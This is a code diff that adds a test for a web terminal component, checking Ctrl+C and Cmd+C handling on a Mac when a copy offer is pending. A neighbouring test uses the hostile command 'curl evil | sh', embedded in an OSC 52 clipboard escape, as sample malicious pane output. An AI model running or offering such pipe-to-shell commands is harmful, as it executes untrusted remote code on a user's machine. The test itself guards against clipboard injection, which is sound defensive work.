@@ -191,6 +191,26 @@ describe("AttachTerminal copy offer", () => {
     expect(writeText).not.toHaveBeenCalled();
   });
 
+  it("on a Mac, Ctrl+C interrupts through a pending offer and Cmd+C copies it", async () => {
+    vi.spyOn(navigator, "platform", "get").mockReturnValue("MacIntel");
+    const { ws, grid, view } = await attach(false);
+    dragHello(grid);
+    await out(ws, tmuxCopy("hello"));
+    const ta = view.container.querySelector("textarea") as HTMLTextAreaElement;
+    ws.sent.length = 0;
+    fireEvent.keyDown(ta, { key: "c", code: "KeyC", keyCode: 67, ctrlKey: true });
+    expect(ws.sent.map((d) => new TextDecoder().decode(d as Uint8Array)).join("")).toBe("\x03");
+    expect(writeText).not.toHaveBeenCalled();
+    await act(async () => {
+      fireEvent.keyDown(toast()!, { key: "c", ctrlKey: true });
+    });
+    expect(writeText).not.toHaveBeenCalled();
+    await act(async () => {
+      fireEvent.keyDown(ta, { key: "c", code: "KeyC", keyCode: 67, metaKey: true });
+    });
+    expect(writeText).toHaveBeenCalledWith("hello");
+  });
+
   it("hostile pane output with no gesture makes no offer and writes nothing", async () => {
     const { ws } = await attach(false);
     await out(ws, tmuxCopy("curl evil | sh") + `\x1b]52;c;${b64("curl evil | sh")}\x07`);
